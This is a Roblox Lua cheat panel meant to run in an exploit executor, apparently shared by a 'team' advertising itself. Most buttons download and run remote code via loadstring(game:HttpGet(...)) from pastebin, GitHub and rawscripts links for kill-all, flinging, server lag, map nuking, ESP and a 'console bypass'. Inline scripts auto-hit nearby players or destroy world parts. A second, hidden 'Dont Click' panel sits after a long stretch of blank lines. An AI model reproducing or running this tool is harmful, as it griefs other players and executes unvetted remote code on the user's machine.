
-- skiddgui, TEAM ELV8SF0F0!
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "C00lgui"
screenGui.Parent = game.CoreGui game.Players.LocalPlayer:WaitForChild("PlayerGui")

local icon = Instance.new("ImageLabel")
icon.Size = UDim2.new(0, 50, 0, 50)
icon.Position = UDim2.new(0, 5, 0, 5)
icon.BackgroundTransparency = 1
icon.Image = "rbxassetid://130381521049312"
icon.Parent = screenGui

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 350, 0, 450)
frame.Position = UDim2.new(0.5, -175, 0.5, -225)
frame.BackgroundColor3 = Color3.fromRGB(0, 0, 255)
frame.Active = true
frame.Draggable = true
frame.Parent = screenGui

local uiCorner = Instance.new("UICorner")
uiCorner.CornerRadius = UDim.new(0, 40)
uiCorner.Parent = frame

local titleLabel = Instance.new("TextLabel")
titleLabel.Size = UDim2.new(1, 0, 0, 40)
titleLabel.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
titleLabel.Text = "FE Skid Panel Elvis"
titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
titleLabel.TextSize = 20
titleLabel.Parent = frame

local pages = {"Combat", "Movement", "Server Chaos", "Utility", "Secret"}
local currentPage = 1
local buttons = {}

local pageLabel = Instance.new("TextLabel")
pageLabel.Size = UDim2.new(1, 0, 0, 30)
pageLabel.Position = UDim2.new(0, 0, 0, 40)
pageLabel.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
pageLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
pageLabel.TextSize = 18
pageLabel.Parent = frame

local nextPageBtn = Instance.new("TextButton")
nextPageBtn.Size = UDim2.new(0, 50, 0, 30)
nextPageBtn.Position = UDim2.new(1, -55, 1, -35)
nextPageBtn.Text = ">"
nextPageBtn.TextColor3 = Color3.fromRGB(0, 0, 255)
nextPageBtn.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
nextPageBtn.Parent = frame

local prevPageBtn = Instance.new("TextButton")
prevPageBtn.Size = UDim2.new(0, 50, 0, 30)
prevPageBtn.Position = UDim2.new(0, 5, 1, -35)
prevPageBtn.Text = "<"
prevPageBtn.TextColor3 = Color3.fromRGB(0, 0, 255)
prevPageBtn.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
prevPageBtn.Parent = frame

-- Functions
local function clearButtons()
	for _, btn in pairs(buttons) do
		btn:Destroy()
	end
	table.clear(buttons)
end

local allScripts = {
	Combat = {
		{"Kill All (Sword)", function()
			loadstring(game:HttpGet('https://raw.githubusercontent.com/zephyr10101/sword-kill-all/main/script'))()
		end},
		{"Fling All", function()
			loadstring(game:HttpGet("https://pastebin.com/raw/4nDpRkZU"))()
		end},
		{"Instant Kill (Sword)", function()
			--// skibdi \\--
--// Setting \--
local range = 7.5
 
--// Variable \--
local player = game:GetService("Players").LocalPlayer
 
--// Script \--
game:GetService("RunService").RenderStepped:Connect(function()
    local p = game.Players:GetPlayers()
    for i = 2, #p do local v = p[i].Character
        if v and v:FindFirstChild("Humanoid") and v.Humanoid.Health > 0 and v:FindFirstChild("HumanoidRootPart") and player:DistanceFromCharacter(v.HumanoidRootPart.Position) <= range then
            local tool = player.Character and player.Character:FindFirstChildOfClass("Tool")
            if tool and tool:FindFirstChild("Handle") then
                tool:Activate()
                for i,v in next, v:GetChildren() do
                    if v:IsA("BasePart") then
                        firetouchinterest(tool.Handle,v,0)
                        firetouchinterest(tool.Handle,v,1)
                    end
                end
            end
        end
    end
end)
		end},
		{"Fire Punch", function()
			loadstring(game:HttpGet("https://pastebin.com/raw/4GcLZ68z"))()
		end},
		{"Ban Hammer (AdminRequired)", function()
			game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents")
         :WaitForChild("SayMessageRequest")
         :FireServer(";gear me 10468797", "All")
		end},
		{"Slam Ground", function()
			loadstring(game:HttpGet("https://pastebin.com/raw/mQ6x6dTM"))()
		end},
		{"Laser Eyes", function()
			loadstring(game:HttpGet("https://pastebin.com/raw/gnc1GqQy"))()
		end},
		{"Yeet Players GUI", function()
			loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Yeet-Script-4394"))()
		end},
		{"Explode Punch", function()
			loadstring(game:HttpGet("https://pastebin.com/raw/ghDgM2ce"))()
		end},
		{"Nuke Fist", function()
			loadstring(game:HttpGet("https://pastebin.com/raw/nk7XigMp"))()
		end},
	},
	Movement = {
		{"Infinite Jump", function()
			game:GetService("UserInputService").JumpRequest:Connect(function()
				game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid"):ChangeState("Jumping")
			end)
		end},
		{"Freecam", function()
			loadstring(game:HttpGet('https://raw.githubusercontent.com/GhostPlayer352/Test4/main/Freecam'))()
		end},
		{"Fly GUI", function()
			loadstring(game:HttpGet("https://raw.githubusercontent.com/XNEOFF/FlyGuiV3/main/FlyGuiV3.txt"))()
		end},
		{"Speed Boost", function()
			game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 50
		end},
		{"Super Jump", function()
			game.Players.LocalPlayer.Character.Humanoid.JumpPower = 150
		end},
		{"Teleport Forward", function()
			local char = game.Players.LocalPlayer.Character
			char:SetPrimaryPartCFrame(char.PrimaryPart.CFrame * CFrame.new(0, 0, -50))
		end},
		{"Teleport to Lobby", function()
			game.Players.LocalPlayer.Character:MoveTo(Vector3.new(0, 50, 0))
		end},
		{"Invisible (Best Invisible)", function()
			loadstring(game:HttpGet("https://pastebin.com/raw/hracJzLa"))()
		end},
		{"TP to Player GUI", function()
			loadstring(game:HttpGet("https://gist.githubusercontent.com/DagerFild/b4776075a0d26ef04394133ee6bd2081/raw/0ed51ac94057d2d9a9f00e1b037b9011c76ca54a/tpGUI", true))()
		end},
		{"Slow-Mo", function()
			game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 5
		end},
	},
	Server_Chaos = {
		{"Destroy Server (KickGUI)", function()
			loadstring(game:HttpGet("https://pastebin.com/raw/ZXAZyL3q",true))()
		end},
		{"Lag Server (Chat)", function()
			loadstring(game:HttpGet("https://raw.githubusercontent.com/BidoSkinsYT/BidoSkinsYT/main/Fe%20lag%20chat%20Gui"))()
		end},
		{"Nuke Map", function()
			loadstring(game:HttpGet("https://pastebin.com/raw/qS7nurWn",true))()
		end},
		{"Explode Everything", function()
			loadstring(game:HttpGet("https://pastebin.com/raw/YmtrJH5Y", true))()
		end},
		{"Anchor Chaos", function()
			--// Unanchor Everything Script
for _, obj in pairs(game.Workspace:GetDescendants()) do
    if obj:IsA("BasePart") and obj.Anchored then
        obj.Anchored = false
    end
end
		end},
		{"Delete All Parts", function()
			for _, obj in pairs(workspace:GetChildren()) do if obj:IsA("BasePart") then obj:Destroy() end end
		end},
		{"Break Gravity", function()
			workspace.Gravity = 0
		end},
		{"Rain Parts", function()
			loadstring(game:HttpGet('https://pastebin.com/raw/JCkN2czS'))()
		end},
		{"Bounce Everything", function()
			--// Bounce Everything Script
for _, obj in pairs(workspace:GetDescendants()) do
    if obj:IsA("BasePart") and obj.Anchored == false then
        -- Add bounce physics
        local force = Instance.new("BodyVelocity")
        force.Velocity = Vector3.new(
            math.random(-100, 100),
            math.random(50, 150),
            math.random(-100, 100)
        )
        force.MaxForce = Vector3.new(1e5, 1e5, 1e5)
        force.P = 1e5
        force.Parent = obj

        -- Optional: remove the force after a short time to let them fall again
        game.Debris:AddItem(force, 0.5)
    end
end
		end},
		{"Spin World", function()
			--// Spin World Script
local player = game.Players.LocalPlayer
local char = player.Character or player.CharacterAdded:Wait()

-- Create a spinning model to hold everything
local spinModel = Instance.new("Model", workspace)
spinModel.Name = "SpinningWorld"

-- Move everything except player's character into the spinning model
for _, obj in pairs(workspace:GetChildren()) do
    if obj ~= char and obj ~= spinModel then
        pcall(function()
            obj.Parent = spinModel
        end)
    end
end

-- Create a rotation script
local RunService = game:GetService("RunService")
local rotationSpeed = 1 -- degrees per frame

RunService.RenderStepped:Connect(function()
    spinModel:PivotTo(spinModel:GetPivot() * CFrame.Angles(0, math.rad(rotationSpeed), 0))
end)
		end},
	},
	Utility = {
		{"God Mode", function()
			loadstring(game:HttpGet("https://pastebin.com/raw/G5Dz4t54",true))()
		end},
		{"ESP", function()
			loadstring(game:HttpGet("https://pastebin.com/raw/nb79jjdb",true))()
		end},
		{"TP Tool", function()
			loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Teleport-tool-7095",true))()
		end},
		{"Chat Hax V3", function()
			loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-FE-Chat-Hax-V3-3412",true))()
		end},
		{"Clone Player", function()
			--// Clone Player Script
local player = game.Players.LocalPlayer
local char = player.Character or player.CharacterAdded:Wait()

-- Clone the character
local clone = char:Clone()
clone.Name = player.Name .. "_Clone"

-- Reposition the clone slightly so it's not overlapping
local rootPart = clone:FindFirstChild("HumanoidRootPart")
if rootPart then
    rootPart.CFrame = rootPart.CFrame * CFrame.new(5, 0, 0)
end

-- Disable animations & physics (optional)
if clone:FindFirstChildOfClass("Humanoid") then
    clone:FindFirstChildOfClass("Humanoid").DisplayName = "Clone"
end

-- Parent it to Workspace
clone.Parent = workspace
		end},
		{"View Others", function()
			loadstring(game:HttpGet("https://pastebin.com/raw/hDd6w1iK",true))()
		end},
		{"Tool Giver", function()
			loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Game-tool-giver-12133"))()
		end},
		{"Console Bypass", function()
			loadstring(game:HttpGet("https://raw.githubusercontent.com/Dhelannn/Test/refs/heads/main/Test1"))()
		end},
		{"Click Destroy", function()
			loadstring(game:HttpGet("https://pastebin.com/raw/yeEqi8js"))()
		end},
		{"Name Changer", function()
			loadstring(game:HttpGet("https://pastebin.com/raw/u10D8KDn"))()
		end},
	},
	Secret = {
		{"Become blu3skidd", function()
			loadstring(game:HttpGet("https://pastebin.com/raw/qtFQha54"))()
		end},
		{"Glitch Mode", function()
			--// Glitch Mode Script (Crazy Part Effects)
local player = game.Players.LocalPlayer
local char = player.Character or player.CharacterAdded:Wait()

-- Sound effect
local sfx = Instance.new("Sound", char:WaitForChild("HumanoidRootPart"))
sfx.SoundId = "rbxassetid://9118823107" -- glitchy sound
sfx.Volume = 2
sfx.Looped = true
sfx:Play()

-- Glitch effect loop
task.spawn(function()
	while true do
		for _, part in ipairs(char:GetDescendants()) do
			if part:IsA("BasePart") and part.Name ~= "HumanoidRootPart" then
				-- Random neon colors
				part.Color = Color3.new(math.random(), math.random(), math.random())
				part.Material = Enum.Material.Neon
				
				-- Random rotation
				part.CFrame *= CFrame.Angles(
					math.rad(math.random(-10, 10)),
					math.rad(math.random(-10, 10)),
					math.rad(math.random(-10, 10))
				)

				-- Jitter position slightly
				part.Position += Vector3.new(
					math.random(-1, 1) * 0.2,
					math.random(-1, 1) * 0.2,
					math.random(-1, 1) * 0.2
				)

				-- Flicker transparency
				part.Transparency = math.random() < 0.2 and 0.5 or 0
			end
		end
		task.wait(0.05)
	end
end)
		end},
		{"Spawn Clone Army", function()
			--// Clone Army Script
local player = game.Players.LocalPlayer
local char = player.Character or player.CharacterAdded:Wait()
local root = char:WaitForChild("HumanoidRootPart")
local armySize = 10 -- change this number for more/fewer clones
local spacing = 6 -- space between each clone

-- Function to clone the player and spawn in front
local function spawnClone(pos)
	local clone = char:Clone()
	clone.Name = player.Name .. "_Clone"
	
	-- Cleanup for clone
	for _, v in clone:GetDescendants() do
		if v:IsA("Script") or v:IsA("LocalScript") then
			v:Destroy()
		end
	end

	-- Move clone to position
	local hrp = clone:FindFirstChild("HumanoidRootPart")
	if hrp then
		hrp.Anchored = true
		hrp.CFrame = CFrame.new(pos)
	end

	-- Remove any tools/clutter
	for _, tool in ipairs(clone:GetChildren()) do
		if tool:IsA("Tool") then tool:Destroy() end
	end

	-- Disable movement
	local hum = clone:FindFirstChildOfClass("Humanoid")
	if hum then
		hum.DisplayName = "Clone"
		hum:ChangeState(Enum.HumanoidStateType.Physics)
	end

	clone.Parent = workspace
end

-- Spawn the army in a circle formation
for i = 1, armySize do
	local angle = (math.pi * 2 / armySize) * i
	local offset = Vector3.new(math.cos(angle), 0, math.sin(angle)) * spacing
	local spawnPos = root.Position + offset
	spawnClone(spawnPos)
end
		end},
		{"Rainbow Chaos", function()
			--// Rainbow Chaos: Global Edition
local function rainbow()
	local t = tick()
	local r = math.sin(t * 4) * 0.5 + 0.5
	local g = math.sin(t * 4 + 2) * 0.5 + 0.5
	local b = math.sin(t * 4 + 4) * 0.5 + 0.5
	return Color3.new(r, g, b)
end

-- Looping chaos
task.spawn(function()
	while true do
		local color = rainbow()
		for _, obj in ipairs(workspace:GetDescendants()) do
			if obj:IsA("BasePart") then
				obj.Color = color
				obj.Material = Enum.Material.Neon
			elseif obj:IsA("Decal") then
				obj.Color3 = color
			elseif obj:IsA("ParticleEmitter") then
				obj.Color = ColorSequence.new(color)
			end
		end
		task.wait(0.05)
	end
end)
		end},
		{"c00lkidd Jumpscare", function()
			--// c00lkidd Jumpscare Script
local player = game.Players.LocalPlayer
local camera = workspace.CurrentCamera

-- Step 1: Jumpscare Image GUI
local gui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
gui.Name = "c00lkiddJumpscare"
gui.ResetOnSpawn = false

local image = Instance.new("ImageLabel", gui)
image.BackgroundTransparency = 1
image.Size = UDim2.new(1, 0, 1, 0)
image.Image = "rbxassetid://13590534736" -- c00lkidd avatar or red-glitch image
image.ImageTransparency = 1

-- Step 2: Sound
local sfx = Instance.new("Sound", camera)
sfx.SoundId = "rbxassetid://9118823107" -- glitchy or horror jumpscare sound
sfx.Volume = 5

-- Step 3: Flash effect
local flash = Instance.new("Frame", gui)
flash.BackgroundColor3 = Color3.new(1, 0, 0)
flash.Size = UDim2.new(1, 0, 1, 0)
flash.BackgroundTransparency = 1

-- Step 4: Execute jumpscare
task.spawn(function()
	sfx:Play()
	
	-- Flash red
	for i = 1, 10 do
		flash.BackgroundTransparency = 1 - (i * 0.1)
		task.wait(0.02)
	end
	
	-- Show image
	for i = 1, 10 do
		image.ImageTransparency = 1 - (i * 0.1)
		task.wait(0.02)
	end
	
	wait(0.5)
	
	-- Fade out
	for i = 1, 10 do
		image.ImageTransparency = i * 0.1
		flash.BackgroundTransparency = i * 0.1
		task.wait(0.02)
	end
	
	-- Cleanup
	gui:Destroy()
	sfx:Destroy()
end)
		end},
		{"Script Error Flood", function()
			loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Spam-GUI-43058"))()
		end},
		{"Weird Music", function()
			--// Spooky scary skeletons ahh music
local Players = game:GetService("Players")
local player = Players.LocalPlayer
local Chat = game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents")
local SayMessageRequest = Chat:WaitForChild("SayMessageRequest")

local spookySongId = 1838601441 -- Spooky Scary Skeletons asset ID

local function isPlayerAdmin()
    local playerGui = player:WaitForChild("PlayerGui", 5)
    if not playerGui then return false end
    
    local adminGui = playerGui:FindFirstChild("AdminGui")
    if adminGui then
        local client = adminGui:FindFirstChild("Client")
        if client then
            local isAdminBool = client:FindFirstChild("IsAdmin")
            if isAdminBool and isAdminBool:IsA("BoolValue") then
                return isAdminBool.Value
            end
        end
    end
    
    return false
end

if isPlayerAdmin() then
    SayMessageRequest:FireServer(";music " .. spookySongId, "All")
else
    warn("You are not an admin and cannot play the music.")
end
		end},
		{"Dizzy Effect", function()
			--// Dizzy Effect Script (LocalScript)
local player = game.Players.LocalPlayer
local camera = workspace.CurrentCamera

-- Rotation speed and duration
local speed = 2 -- rotation speed multiplier
local duration = 10 -- how long the dizzy effect lasts (in seconds)

-- Start time
local start = tick()

-- Spin the camera
RunService = game:GetService("RunService")
RunService.RenderStepped:Connect(function()
	if tick() - start < duration then
		local spin = CFrame.Angles(0, 0, math.sin(tick() * speed) * 0.5)
		camera.CFrame = camera.CFrame * spin
	end
end)
		end},
		{"World Flip", function()
			--// World Flip Script
for _, obj in pairs(workspace:GetDescendants()) do
	if obj:IsA("BasePart") and not obj.Anchored then
		obj.Anchored = true -- Anchor to avoid falling
	end
	if obj:IsA("BasePart") then
		local pos = obj.Position
		local rot = obj.Orientation

		-- Flip Y position (mirror around Y = 0)
		obj.Position = Vector3.new(pos.X, -pos.Y, pos.Z)

		-- Flip orientation upside down
		obj.Orientation = Vector3.new(-rot.X, rot.Y + 180, -rot.Z)
	end
end

-- Optional: Flip lighting too
if workspace:FindFirstChild("Camera") then
	local cam = workspace.CurrentCamera
	cam.CFrame = cam.CFrame * CFrame.Angles(math.rad(180), 0, 0)
end
		end},
		{"Skinwalker Ahh Script", function()
			loadstring(game:HttpGet("https://pastebin.com/raw/WyqDmp0t"))()
		end},
	}
}

local function createButton(name, position, action)
	local button = Instance.new("TextButton")
	button.Size = UDim2.new(1, -10, 0, 30)
	button.Position = position
	button.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
	button.Text = name
	button.TextColor3 = Color3.fromRGB(255, 0, 0)
	button.TextSize = 18
	button.Parent = frame
	table.insert(buttons, button)
	button.MouseButton1Click:Connect(action)
end

local function updatePage()
	clearButtons()
	local name = pages[currentPage]
	local scriptList = allScripts[name:gsub(" ", "_")]
	pageLabel.Text = "[" .. name .. "] - Page " .. currentPage
	for i, v in ipairs(scriptList) do
		createButton(v[1], UDim2.new(0, 5, 0, 80 + (i-1) * 35), v[2])
	end
end

nextPageBtn.MouseButton1Click:Connect(function()
	if currentPage < #pages then
		currentPage += 1
		updatePage()
	end
end)

prevPageBtn.MouseButton1Click:Connect(function()
	if currentPage > 1 then
		currentPage -= 1
		updatePage()
	end
end)

updatePage()

-- team elv8sf0f0 join today!







-- not the end of the script

















-- Secret

local player = game.Players.LocalPlayer
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "C00lguiV2"
screenGui.Parent = player:WaitForChild("PlayerGui")

-- Create the corner button
local box = Instance.new("TextButton")
box.Size = UDim2.new(0, 100, 0, 50)
box.Position = UDim2.new(1, -120, 0, 20)
box.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
box.BorderColor3 = Color3.fromRGB(0, 0, 255)
box.BorderSizePixel = 3
box.Text = "Dont Click"
box.TextColor3 = Color3.fromRGB(0, 0, 255)
box.Parent = screenGui

-- Add corner to box
local boxCorner = Instance.new("UICorner")
boxCorner.CornerRadius = UDim.new(0, 12)
boxCorner.Parent = box

-- Main GUI
local c00lgui = Instance.new("Frame")
c00lgui.Size = UDim2.new(0, 400, 0, 600)
c00lgui.Position = UDim2.new(0.5, -200, 0.5, -300)
c00lgui.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
c00lgui.BorderColor3 = Color3.fromRGB(255, 0, 0)
c00lgui.BorderSizePixel = 5
c00lgui.Visible = false
c00lgui.Parent = screenGui

-- Add corner to main GUI
local guiCorner = Instance.new("UICorner")
guiCorner.CornerRadius = UDim.new(0, 16)
guiCorner.Parent = c00lgui

-- Server Destruction Button
local destructionButton = Instance.new("TextButton")
destructionButton.Size = UDim2.new(0, 200, 0, 50)
destructionButton.Position = UDim2.new(0.5, -100, 0.8, -25)
destructionButton.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
destructionButton.BorderColor3 = Color3.fromRGB(255, 0, 0)
destructionButton.BorderSizePixel = 3
destructionButton.Text = "ERROR"
destructionButton.TextColor3 = Color3.fromRGB(255, 0, 0)
destructionButton.Parent = c00lgui

-- Add corner to button
local destroyCorner = Instance.new("UICorner")
destroyCorner.CornerRadius = UDim.new(0, 10)
destroyCorner.Parent = destructionButton

-- Scrolling Message Area
local messageHolder = Instance.new("ScrollingFrame")
messageHolder.Size = UDim2.new(1, -20, 0.6, 0)
messageHolder.Position = UDim2.new(0, 10, 0, 10)
messageHolder.BackgroundTransparency = 1
messageHolder.CanvasSize = UDim2.new(0, 0, 5, 0)
messageHolder.BorderSizePixel = 0
messageHolder.ScrollBarImageColor3 = Color3.fromRGB(255, 0, 0)
messageHolder.Parent = c00lgui

-- Add corner to message area
local messageCorner = Instance.new("UICorner")
messageCorner.CornerRadius = UDim.new(0, 10)
messageCorner.Parent = messageHolder

-- Sound effect
local staplerSound = Instance.new("Sound")
staplerSound.Name = "StaplerGodSound"
staplerSound.SoundId = "rbxassetid://9118823106" -- You can change this
staplerSound.Volume = 1
staplerSound.Looped = true
staplerSound.Parent = screenGui

-- Function to create message labels
local function addMessage(text)
	local label = Instance.new("TextLabel")
	label.Size = UDim2.new(1, 0, 0, 30)
	label.BackgroundTransparency = 1
	label.Text = text
	label.TextColor3 = Color3.fromRGB(255, 0, 0)
	label.TextScaled = true
	label.Font = Enum.Font.GothamBlack
	label.Parent = messageHolder
	messageHolder.CanvasSize = UDim2.new(0, 0, 0, #messageHolder:GetChildren() * 30)
end

-- Show GUI, play sound, spam messages
box.MouseButton1Click:Connect(function()
	c00lgui.Visible = true
	staplerSound:Play()

	coroutine.wrap(function()
		while c00lgui.Visible do
			addMessage("GET SKIDDED LOL")
			wait(0.5)
		end
	end)()
end)

-- Server destruction logic
destructionButton.MouseButton1Click:Connect(function()
	for _, part in pairs(workspace:GetDescendants()) do
		if part:IsA("BasePart") then
			part:Destroy()
		end
	end
end)



-- team elv8sf0f0 join today!

-- (updating alot)